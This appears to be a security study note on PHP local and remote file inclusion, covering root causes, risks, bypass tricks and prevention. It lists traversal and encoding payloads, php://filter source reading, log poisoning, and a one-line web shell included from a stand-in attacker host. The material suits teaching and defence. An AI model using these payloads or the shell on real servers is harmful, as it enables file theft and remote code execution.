# 20 - File Inclusion (LFI/RFI)

## Introduction
- File inclusion vulnerabilities occur when an application includes files based on untrusted input. Two main types:
	- Local File Inclusion (LFI): read/execute files on the same server.
	- Remote File Inclusion (RFI): include files from remote servers (executes attacker code).

## Root cause
- Typically caused by insufficient validation or filtering of file path inputs (e.g., `include($_GET['page']);`). Attackers manipulate the path to read sensitive files or include remote code.

## Example (vulnerable PHP)
```php
$file = $_GET['page'];
include($file);
```

If `page=../../../../etc/passwd` the app may expose `/etc/passwd`.

## Risks
- Information disclosure (config, credentials).
- Unauthorized file access/manipulation.
- Remote code execution (RFI) and full server compromise.
- Service disruption.

## LFI techniques & examples
- Path traversal: using `../` sequences to reach files outside the webroot (e.g., `/etc/passwd`).
- Log poisoning / PHP code injection: inject PHP into logs (User-Agent, Referer) and then include log file via LFI to execute code.
- `php://filter` usage: read file contents as base64 to bypass direct restrictions:
	- `php://filter/convert.base64-encode/resource=home.php`
	- Decode the returned Base64 to recover source code.

## Common bypass techniques (from source)
1. Path traversal filter evasion: use `....//` or variants that bypass naive `str_replace('../','',...)` filters (e.g., `....//....//etc/passwd`).
2. URL / double encoding: `%2e%2e%2f` or double-encode (`%252e%252e%252f`) to bypass filters.
3. Approved-path bypass: prepend allowed path then traverse: `./languages/../../../../etc/passwd`.
4. Null byte (%00) (older PHP): terminate appended extensions (e.g., `/etc/passwd%00`) to bypass `.php` suffix checks.

## RFI specifics
- RFI requires remote inclusion to be allowed (PHP `allow_url_include`/`allow_url_fopen` enabled).
- Attack flow: host malicious file (e.g., `shell.php` with `<?php system($_GET['cmd']); ?>`) on attacker server and include it: `?page=https://attacker/shell.php`.
- RFI can lead to immediate remote code execution and credential theft.

## Detection & practical lab notes
- Check dynamic include parameters (e.g., `page`, `lang`) for traversal or remote URL acceptance.
- Try simple traversal: `../../../../etc/passwd` and encoded variants.
- For log poisoning: inject PHP into User-Agent and then request the log via LFI.

## Vulnerable vs secure patterns (PHP)
- Vulnerable:
```php
 $file = $_GET['page'];
 include($file);
```

- Safer patterns:
	- Whitelist allowed files (map keys to filenames).
	- Use fixed/full paths and avoid direct user input in includes.
	- Use `realpath()` and verify the resolved path is inside allowed directory.
	- Disable remote includes: `allow_url_include = Off`, `allow_url_fopen = Off`.

Example (whitelist):
```php
$allowed = ['home' => '/var/www/html/home.php', 'about' => '/var/www/html/about.php'];
$page = $_GET['page'];
if (isset($allowed[$page])) include($allowed[$page]);
else echo 'Invalid page';
```

Example (realpath check):
```php
$base = realpath('/var/www/html/');
$path = realpath($base . '/' . $_GET['page']);
if (strpos($path, $base) === 0) include($path);
else echo 'Invalid path';
```

## Prevention checklist
1. Input validation: whitelist filenames or patterns; disallow user-controlled paths.
2. Use full/fixed include paths; avoid runtime concatenation with raw input.
3. Disable remote file includes in PHP (`allow_url_include`/`allow_url_fopen`).
4. Enforce least privilege on file permissions and ownership.
5. Use `realpath()` and verify includes stay inside the allowed directory.
6. Prevent log poisoning by not writing raw user input into executable logs, and encode logs before writing.
7. Use WAF (e.g., ModSecurity) and custom rules to block LFI/RFI patterns.
8. Keep software patched and perform regular code review and penetration testing.

## Example exploitation checklist
- Try direct traversal, encoded traversal, php://filter, log poisoning, and RFI (only in authorized labs).
- For RFI, confirm `allow_url_include` and `allow_url_fopen` before attempting remote inclusion.



